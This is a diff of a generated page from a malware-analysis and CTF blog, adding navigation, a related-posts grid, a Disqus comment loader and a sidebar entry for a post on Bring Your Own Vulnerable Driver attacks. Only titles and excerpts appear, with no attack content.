+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=http://0.0.0.0:8000/2023/06/13/Quick_Study_of_BYOVD/&amp;media=http://0.0.0.0:8000/images/quickstudyBYOVD/backgroundimage.png&amp;description=Quick%20Study%20of%20Bring%20Your%20Own%20Vulnerable%20Driver%20(BYOVD)" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+      </div>
+    </div>
+
+    <div class="post__navigation">
+      
+      <a class="prev" href="/2023/03/25/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/">
+        <img class="post__nav-image lazy" data-src="/images/alien-saboteaur/backgroundimage.png" alt="Alien Saboteaur - HTB Cyber Apocalyse 2023">
+        <div class="post__nav-box">
+          <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
+          <h4 class="post__nav__title">Alien Saboteaur - HTB Cyber Apocalyse 2023</h4>
+        </div>
+      </a>
+      
+      
+    </div>
+
   </article>
 </div>
-<!-- end page -->
+<!-- end post -->
+
+
+
+
+
+
+
+<div class="container">
+  <div class="related-posts is-related">
+    <div class="row">
+      <div class="col col-12">
+        <div class="container__inner">
+          <h3 class="related-title">You may also like</h3>
+          <div class="row grid">
+
+          
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2023/03/25/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/">
+                  <img class="lazy" data-src="/images/alien-saboteaur/backgroundimage.png" alt="Alien Saboteaur - HTB Cyber Apocalyse 2023">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        32 min read
+                      
+                      <time class="article__date"
+                        datetime="2023-03-25T18:45:00+00:00">Mar 25, 2023</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">Alien Saboteaur - HTB Cyber Apocalyse 2023</h2>
+
+                  <p class="article__excerpt">A quick writeup on a Virtual Machine Based CTF Challenge.</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">MalwareOwl</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/Writeups" class="article__tag">Writeups</a>
+                        
+                          <a href="/tag/CTF" class="article__tag">CTF</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/">
+                  <img class="lazy" data-src="/images/flash_analysis_1/326d26f624af4b02bae8b528cdce9752.png" alt="A quick Look at a Dropper and Downloader">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        6 min read
+                      
+                      <time class="article__date"
+                        datetime="2023-03-11T09:54:00+00:00">Mar 11, 2023</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">A quick Look at a Dropper and Downloader</h2>
+
+                  <p class="article__excerpt">Just a random quick analysis of a recent sample that was uploaded on VirusTotal. The first ever in this blog at least ...</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">MalwareOwl</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/QuickPeek" class="article__tag">QuickPeek</a>
+                        
+                          <a href="/tag/MalwareAnalysis" class="article__tag">MalwareAnalysis</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2022/11/12/Flare-on-9_chall_9_and_11/">
+                  <img class="lazy" data-src="/images/flareon9_9_11/flare-on9_11.png" alt="Flare-on 9 - Challenge 9 and 11">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        10 min read
+                      
+                      <time class="article__date"
+                        datetime="2022-11-12T10:10:00+00:00">Nov 12, 2022</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">Flare-on 9 - Challenge 9 and 11</h2>
+
+                  <p class="article__excerpt">This year of flare-on is the third try and the first that I have ever completed so far! Definitely did have my share of pain and joy during this time of challenges. For this post, I will share my writeup on challenge 9 and 11.</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">MalwareOwl</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/Writeups" class="article__tag">Writeups</a>
+                        
+                          <a href="/tag/CTF" class="article__tag">CTF</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+                  
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+ <!-- begin comments -->
+<div class="container">
+  <div class="row">
+    <div class="col col-12">
+      <div class="disqus-inner">
+        <div id="disqus_thread" class="post-comments">
+          <div id="disqus_empty"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  function load_disqus() {
+    var disqus_shortname = 'anvodstudio-demo',
+      is_disqus_empty = document.getElementById('disqus_empty'),
+      disqus_target = document.getElementById('disqus_thread'),
+      disqus_embed = document.createElement('script'),
+      disqus_hook = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);
+
+    if (disqus_target && is_disqus_empty) {
+      disqus_embed.type = 'text/javascript';
+      disqus_embed.async = true;
+      disqus_embed.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      disqus_hook.appendChild(disqus_embed);
+      is_disqus_empty.remove();
+    }
+  }
+
+  window.addEventListener('scroll', function (e) {
+    var currentScroll = document.scrollingElement.scrollTop;
+    var disqus_target = document.getElementById('disqus_thread');
+
+    if (disqus_target && (currentScroll > disqus_target.getBoundingClientRect().top - 150)) {
+      load_disqus('disqus_shortname');
+    }
+  }, false);
+
+</script>
+<noscript>Please enable JavaScript to view the
+  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<!-- end comments --> 
+
   </main> 
   <!-- end content -->
   
@@ -298,6 +874,33 @@ SOME TEXT HERE IF YOU WANT
       <h3 class="widget__title">Latest Posts</h3>
     </div>
 
+    
+    <div class="recent-posts">
+      
+      <a class="recent-posts__image" href="/2023/06/13/Quick_Study_of_BYOVD/"><img class="lazy" data-src="/images/quickstudyBYOVD/backgroundimage.png" alt="Quick Study of Bring Your Own Vulnerable Driver (BYOVD)"></a>
+      
+      <div class="recent-posts__content">
+        <div class="article__meta">
+          <span class="article__minutes">
+            
+            
+              12 min read
+            
+          </span>
+          <time class="article__date"
+            datetime="2023-06-13T01:27:00+00:00">Jun 13, 2023</time>
+        </div>
+        <h4 class="recent-posts__title"><a href="/2023/06/13/Quick_Study_of_BYOVD/">Quick Study of Bring Your Own Vulnerable Driver (BYOVD)</a></h4>
+        <div class="article__bottom">
+          <div class="article__author">
+            <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+          </div>
+          <div class="article__bottom-meta">
+            <a href="/about/" class="article__author-link">MalwareOwl</a>
+          </div>
+        </div>
+      </div>
+    </div>
     
     <div class="recent-posts">
       
@@ -326,33 +929,6 @@ SOME TEXT HERE IF YOU WANT
       </div>
     </div>
     
-    <div class="recent-posts">
-      
-      <a class="recent-posts__image" href="/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/"><img class="lazy" data-src="/images/flash_analysis_1/326d26f624af4b02bae8b528cdce9752.png" alt="A quick Look at a Dropper and Downloader"></a>
-      
-      <div class="recent-posts__content">
-        <div class="article__meta">
-          <span class="article__minutes">
-            
-            
-              6 min read
-            
-          </span>
-          <time class="article__date"
-            datetime="2023-03-11T09:54:00+00:00">Mar 11, 2023</time>
-        </div>
-        <h4 class="recent-posts__title"><a href="/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/">A quick Look at a Dropper and Downloader</a></h4>
-        <div class="article__bottom">
-          <div class="article__author">
-            <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
-          </div>
-          <div class="article__bottom-meta">
-            <a href="/about/" class="article__author-link">MalwareOwl</a>
-          </div>
-        </div>
-      </div>
-    </div>
-    
 
   </div>
 </div>
@@ -363,7 +939,7 @@ SOME TEXT HERE IF YOU WANT
       <h3 class="widget__title">Explore Tags</h3>
     </div>
     <div class="tag__cloud">
-      <a href="/tag/ctf/" class="set-3">CTF</a> <a href="/tag/malwareanalysis/" class="set-1">MalwareAnalysis</a> <a href="/tag/quickpeek/" class="set-1">QuickPeek</a> <a href="/tag/welcome/" class="set-1">Welcome</a> <a href="/tag/writeups/" class="set-5">Writeups</a>
+      <a href="/tag/ctf/" class="set-2">CTF</a> <a href="/tag/malwareanalysis/" class="set-1">MalwareAnalysis</a> <a href="/tag/quickpeek/" class="set-1">QuickPeek</a> <a href="/tag/welcome/" class="set-1">Welcome</a> <a href="/tag/writeups/" class="set-5">Writeups</a>
     </div>
   </div>
 </div>
